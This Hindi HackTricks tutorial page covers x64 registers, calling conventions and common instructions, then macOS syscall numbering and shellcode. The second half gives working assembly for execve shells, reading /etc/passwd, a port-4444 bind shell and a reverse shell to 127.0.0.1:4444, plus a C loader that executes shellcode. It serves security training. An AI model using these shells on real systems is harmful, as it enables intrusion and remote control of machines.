# x64 का परिचय

{{#include ../../../banners/hacktricks-training.md}}

## **x64 का परिचय**

x64, जिसे x86-64 के नाम से भी जाना जाता है, एक 64-बिट प्रोसेसर आर्किटेक्चर है जो मुख्य रूप से डेस्कटॉप और सर्वर कंप्यूटिंग में उपयोग किया जाता है। यह Intel द्वारा निर्मित x86 आर्किटेक्चर से उत्पन्न हुआ और बाद में AMD द्वारा AMD64 नाम से अपनाया गया, यह आज व्यक्तिगत कंप्यूटरों और सर्वरों में प्रचलित आर्किटेक्चर है।

### **रजिस्टर**

x64 x86 आर्किटेक्चर का विस्तार करता है, जिसमें **16 सामान्य-उद्देश्य रजिस्टर** होते हैं जिन्हें `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi`, और `r8` से `r15` तक लेबल किया गया है। इनमें से प्रत्येक **64-बिट** (8-बाइट) मान को स्टोर कर सकता है। इन रजिस्टरों में 32-बिट, 16-बिट, और 8-बिट उप-रजिस्टर भी होते हैं जो संगतता और विशिष्ट कार्यों के लिए होते हैं।

1. **`rax`** - पारंपरिक रूप से **फंक्शंस** से **रिटर्न वैल्यू** के लिए उपयोग किया जाता है।
2. **`rbx`** - अक्सर मेमोरी ऑपरेशंस के लिए **बेस रजिस्टर** के रूप में उपयोग किया जाता है।
3. **`rcx`** - सामान्यतः **लूप काउंटर** के लिए उपयोग किया जाता है।
4. **`rdx`** - विभिन्न भूमिकाओं में उपयोग किया जाता है जिसमें विस्तारित अंकगणितीय ऑपरेशंस शामिल हैं।
5. **`rbp`** - स्टैक फ्रेम के लिए **बेस पॉइंटर**।
6. **`rsp`** - **स्टैक पॉइंटर**, जो स्टैक के शीर्ष को ट्रैक करता है।
7. **`rsi`** और **`rdi`** - स्ट्रिंग/मेमोरी ऑपरेशंस में **स्रोत** और **गंतव्य** इंडेक्स के लिए उपयोग किया जाता है।
8. **`r8`** से **`r15`** - x64 में पेश किए गए अतिरिक्त सामान्य-उद्देश्य रजिस्टर।

### **कॉलिंग कन्वेंशन**

x64 कॉलिंग कन्वेंशन ऑपरेटिंग सिस्टम के बीच भिन्न होता है। उदाहरण के लिए:

- **Windows**: पहले **चार पैरामीटर** रजिस्टर **`rcx`**, **`rdx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। आगे के पैरामीटर स्टैक पर पुश किए जाते हैं। रिटर्न वैल्यू **`rax`** में होती है।
- **System V (जो UNIX-लाइक सिस्टम में सामान्यतः उपयोग होता है)**: पहले **छह पूर्णांक या पॉइंटर पैरामीटर** रजिस्टर **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`**, और **`r9`** में पास किए जाते हैं। रिटर्न वैल्यू भी **`rax`** में होती है।

यदि फंक्शन में छह से अधिक इनपुट हैं, तो **बाकी स्टैक पर पास किए जाएंगे**। **RSP**, स्टैक पॉइंटर, को **16 बाइट्स संरेखित** होना चाहिए, जिसका अर्थ है कि जिस पते की ओर यह इशारा करता है, वह किसी भी कॉल से पहले 16 से विभाज्य होना चाहिए। इसका मतलब है कि सामान्यतः हमें यह सुनिश्चित करने की आवश्यकता होगी कि RSP हमारे शेलकोड में सही ढंग से संरेखित है इससे पहले कि हम फंक्शन कॉल करें। हालाँकि, प्रैक्टिस में, सिस्टम कॉल कई बार काम करते हैं भले ही यह आवश्यकता पूरी न हो।

### Swift में कॉलिंग कन्वेंशन

Swift का अपना **कॉलिंग कन्वेंशन** है जिसे [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) में पाया जा सकता है।

### **सामान्य निर्देश**

x64 निर्देशों का एक समृद्ध सेट है, जो पहले के x86 निर्देशों के साथ संगतता बनाए रखता है और नए निर्देशों को पेश करता है।

- **`mov`**: एक **रजिस्टर** या **मेमोरी स्थान** से दूसरे में एक मान **स्थानांतरित** करें।
- उदाहरण: `mov rax, rbx` — `rbx` से `rax` में मान स्थानांतरित करता है।
- **`push`** और **`pop`**: स्टैक पर मानों को पुश या पॉप करें।
- उदाहरण: `push rax` — `rax` में मान को स्टैक पर पुश करता है।
- उदाहरण: `pop rax` — स्टैक से शीर्ष मान को `rax` में पॉप करता है।
- **`add`** और **`sub`**: **जोड़** और **घटाव** ऑपरेशंस।
- उदाहरण: `add rax, rcx` — `rax` और `rcx` में मानों को जोड़ता है और परिणाम को `rax` में स्टोर करता है।
- **`mul`** और **`div`**: **गुणा** और **भाग** ऑपरेशंस। नोट: इनका ऑपरेटर उपयोग के संबंध में विशिष्ट व्यवहार होता है।
- **`call`** और **`ret`**: **फंक्शंस** को **कॉल** और **रिटर्न** करने के लिए उपयोग किया जाता है।
- **`int`**: एक सॉफ़्टवेयर **इंटरप्ट** को ट्रिगर करने के लिए उपयोग किया जाता है। उदाहरण: `int 0x80` 32-बिट x86 Linux में सिस्टम कॉल के लिए उपयोग किया गया था।
- **`cmp`**: दो मानों की **तुलना** करें और परिणाम के आधार पर CPU के फ्लैग सेट करें।
- उदाहरण: `cmp rax, rdx` — `rax` की तुलना `rdx` से करता है।
- **`je`, `jne`, `jl`, `jge`, ...**: **संविधानात्मक कूद** निर्देश जो पिछले `cmp` या परीक्षण के परिणामों के आधार पर नियंत्रण प्रवाह को बदलते हैं।
- उदाहरण: `cmp rax, rdx` निर्देश के बाद, `je label` — यदि `rax` `rdx` के बराबर है तो `label` पर कूदता है।
- **`syscall`**: कुछ x64 सिस्टम (जैसे आधुनिक Unix) में **सिस्टम कॉल** के लिए उपयोग किया जाता है।
- **`sysenter`**: कुछ प्लेटफार्मों पर एक अनुकूलित **सिस्टम कॉल** निर्देश।

### **फंक्शन प्रोलॉग**

1. **पुराने बेस पॉइंटर को पुश करें**: `push rbp` (कॉलर के बेस पॉइंटर को सहेजता है)
2. **वर्तमान स्टैक पॉइंटर को बेस पॉइंटर में स्थानांतरित करें**: `mov rbp, rsp` (वर्तमान फंक्शन के लिए नए बेस पॉइंटर को सेट करता है)
3. **स्थानीय वेरिएबल्स के लिए स्टैक पर स्थान आवंटित करें**: `sub rsp, <size>` (जहाँ `<size>` आवश्यक बाइट्स की संख्या है)

### **फंक्शन एपिलॉग**

1. **वर्तमान बेस पॉइंटर को स्टैक पॉइंटर में स्थानांतरित करें**: `mov rsp, rbp` (स्थानीय वेरिएबल्स को डिअलॉकेट करें)
2. **स्टैक से पुराने बेस पॉइंटर को पॉप करें**: `pop rbp` (कॉलर के बेस पॉइंटर को पुनर्स्थापित करता है)
3. **रिटर्न करें**: `ret` (कॉलर को नियंत्रण लौटाता है)

## macOS

### syscalls

syscalls की विभिन्न श्रेणियाँ हैं, आप [**यहाँ उन्हें खोज सकते हैं**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
फिर, आप प्रत्येक syscall संख्या [**इस URL में**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
इसलिए `open` syscall (**5**) को **Unix/BSD वर्ग** से कॉल करने के लिए आपको इसे जोड़ना होगा: `0x2000000`

तो, open को कॉल करने के लिए syscall संख्या होगी `0x2000005`

### Shellcodes

संकलित करने के लिए:
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
बाइट्स निकालने के लिए:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>शेलकोड का परीक्षण करने के लिए C कोड</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### शेल

[**यहाँ**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) से लिया गया और समझाया गया।

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### कैट के साथ पढ़ें

लक्ष्य है `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` को निष्पादित करना, इसलिए दूसरा तर्क (x1) पैरामीटर का एक ऐरे है (जो मेमोरी में इनका मतलब पतों का एक स्टैक है)।
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### sh के साथ कमांड को लागू करें
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Bind shell from [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) in **port 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### रिवर्स शेल

रिवर्स शेल [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) से। रिवर्स शेल **127.0.0.1:4444** पर
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
{{#include ../../../banners/hacktricks-training.md}}
